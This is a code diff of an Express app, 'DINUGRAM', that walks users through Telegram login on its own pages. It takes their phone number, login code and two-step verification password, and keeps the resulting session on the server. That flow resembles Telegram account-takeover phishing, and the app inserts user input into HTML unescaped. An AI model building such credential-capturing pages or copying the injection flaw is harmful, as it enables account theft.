@@ -1,6 +1,7 @@
 const express = require("express");
 const { TelegramClient, Api } = require("telegram");
 const { StringSession } = require("telegram/sessions");
+const { computePasswordSrpCheck } = require("telegram/Password");
 
 const app = express();
 
@@ -11,7 +12,6 @@ const PORT = process.env.PORT || 3000;
 const apiId = Number(process.env.TELEGRAM_API_ID);
 const apiHash = process.env.TELEGRAM_API_HASH;
 
-// Temporary login sessions for testing
 const clients = new Map();
 
 app.get("/", (req, res) => {
@@ -25,7 +25,6 @@ app.get("/", (req, res) => {
           content="width=device-width, initial-scale=1"
         />
       </head>
-
       <body>
         <h2>DINUGRAM</h2>
 
@@ -90,21 +89,6 @@ app.post("/send-code", async (req, res) => {
       })
     );
 
-    const deliveryType =
-      result.type?.className ||
-      result.type?.constructor?.name ||
-      "Unknown";
-
-    console.log(
-      "Telegram code delivery type:",
-      deliveryType
-    );
-
-    console.log(
-      "Code requested for phone ending:",
-      phoneNumber.slice(-4)
-    );
-
     clients.set(phoneNumber, {
       client: client,
       phoneCodeHash: result.phoneCodeHash
@@ -115,7 +99,6 @@ app.post("/send-code", async (req, res) => {
       <html>
         <head>
           <title>DINUGRAM Verification</title>
-
           <meta
             name="viewport"
             content="width=device-width, initial-scale=1"
@@ -125,22 +108,14 @@ app.post("/send-code", async (req, res) => {
         <body>
           <h2>DINUGRAM</h2>
 
-          <p>Telegram verification code requested.</p>
-
-          <p>
-            Delivery type:
-            <strong>${deliveryType}</strong>
-          </p>
+          <p>Enter Telegram login code</p>
 
           <form action="/verify-code" method="POST">
-
             <input
               type="hidden"
               name="phoneNumber"
               value="${phoneNumber}"
             />
-
-            <p>Enter Telegram login code</p>
 
             <input
               type="text"
@@ -153,7 +128,6 @@ app.post("/send-code", async (req, res) => {
             <button type="submit">
               Verify Code
             </button>
-
           </form>
         </body>
       </html>
@@ -164,37 +138,29 @@ app.post("/send-code", async (req, res) => {
 
     res.status(500).send(
       "Error: " +
-        (error.message ||
-          "Could not send verification code")
+        (error.message || "Could not send verification code")
     );
   }
 });
 
 app.post("/verify-code", async (req, res) => {
+  const phoneNumber = req.body.phoneNumber;
+  const phoneCode = req.body.phoneCode;
+
   try {
-    const phoneNumber = req.body.phoneNumber;
-    const phoneCode = req.body.phoneCode;
-
-    if (!phoneNumber || !phoneCode) {
-      return res
-        .status(400)
-        .send("Phone number and code are required");
-    }
-
     const loginData = clients.get(phoneNumber);
 
     if (!loginData) {
       return res.status(400).send(`
         <h2>DINUGRAM</h2>
         <p>Login session expired.</p>
-        <p>Please go back and request a new code.</p>
-        <a href="/">Back to Login</a>
+        <a href="/">Try Again</a>
       `);
     }
 
     const { client, phoneCodeHash } = loginData;
 
-    const result = await client.invoke(
+    await client.invoke(
       new Api.auth.SignIn({
         phoneNumber: phoneNumber,
         phoneCodeHash: phoneCodeHash,
@@ -204,10 +170,114 @@ app.post("/verify-code", async (req, res) => {
 
     const session = client.session.save();
 
-    console.log(
-      "Telegram login successful for phone ending:",
-      phoneNumber.slice(-4)
+    console.log("Telegram login successful");
+    console.log("Session created successfully");
+
+    clients.delete(phoneNumber);
+
+    res.send(`
+      <h2>DINUGRAM</h2>
+      <h3>Login successful ✅</h3>
+      <p>Your Telegram account is connected.</p>
+    `);
+
+  } catch (error) {
+    console.error("Verify code error:", error);
+
+    if (
+      error.message &&
+      error.message.includes("SESSION_PASSWORD_NEEDED")
+    ) {
+      return res.send(`
+        <!DOCTYPE html>
+        <html>
+          <head>
+            <title>DINUGRAM Two-Step Verification</title>
+            <meta
+              name="viewport"
+              content="width=device-width, initial-scale=1"
+            />
+          </head>
+
+          <body>
+            <h2>DINUGRAM</h2>
+
+            <p>Two-Step Verification password is required.</p>
+
+            <form action="/verify-password" method="POST">
+              <input
+                type="hidden"
+                name="phoneNumber"
+                value="${phoneNumber}"
+              />
+
+              <input
+                type="password"
+                name="password"
+                placeholder="Telegram password"
+                required
+              />
+
+              <button type="submit">
+                Verify Password
+              </button>
+            </form>
+          </body>
+        </html>
+      `);
+    }
+
+    res.status(500).send(`
+      <h2>DINUGRAM</h2>
+      <p>Verification failed.</p>
+      <p>${error.message || "Invalid code"}</p>
+      <a href="/">Try Again</a>
+    `);
+  }
+});
+
+app.post("/verify-password", async (req, res) => {
+  try {
+    const phoneNumber = req.body.phoneNumber;
+    const password = req.body.password;
+
+    if (!phoneNumber || !password) {
+      return res
+        .status(400)
+        .send("Phone number and password are required");
+    }
+
+    const loginData = clients.get(phoneNumber);
+
+    if (!loginData) {
+      return res.status(400).send(`
+        <h2>DINUGRAM</h2>
+        <p>Login session expired.</p>
+        <a href="/">Try Again</a>
+      `);
+    }
+
+    const { client } = loginData;
+
+    const passwordInfo = await client.invoke(
+      new Api.account.GetPassword({})
     );
+
+    const passwordCheck = await computePasswordSrpCheck(
+      passwordInfo,
+      password
+    );
+
+    await client.invoke(
+      new Api.auth.CheckPassword({
+        password: passwordCheck
+      })
+    );
+
+    const session = client.session.save();
+
+    console.log("Two-Step Verification successful");
+    console.log("Telegram session created successfully");
 
     clients.delete(phoneNumber);
 
@@ -216,7 +286,6 @@ app.post("/verify-code", async (req, res) => {
       <html>
         <head>
           <title>DINUGRAM</title>
-
           <meta
             name="viewport"
             content="width=device-width, initial-scale=1"
@@ -236,23 +305,12 @@ app.post("/verify-code", async (req, res) => {
     `);
 
   } catch (error) {
-    console.error("Verify code error:", error);
-
-    if (
-      error.message &&
-      error.message.includes("SESSION_PASSWORD_NEEDED")
-    ) {
-      return res.status(401).send(`
-        <h2>DINUGRAM</h2>
-        <p>Two-Step Verification password is required.</p>
-        <p>We will add the password screen next.</p>
-      `);
-    }
+    console.error("Password verification error:", error);
 
     res.status(500).send(`
       <h2>DINUGRAM</h2>
-      <p>Verification failed.</p>
-      <p>${error.message || "Invalid verification code"}</p>
+      <p>Password verification failed.</p>
+      <p>${error.message || "Wrong password"}</p>
       <a href="/">Try Again</a>
     `);
   }
